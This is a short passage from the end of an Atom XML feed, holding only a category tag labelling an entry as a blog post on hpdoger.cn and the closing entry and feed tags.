      <category term="博客文章" scheme="https://hpdoger.cn/tags/%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
</feed>
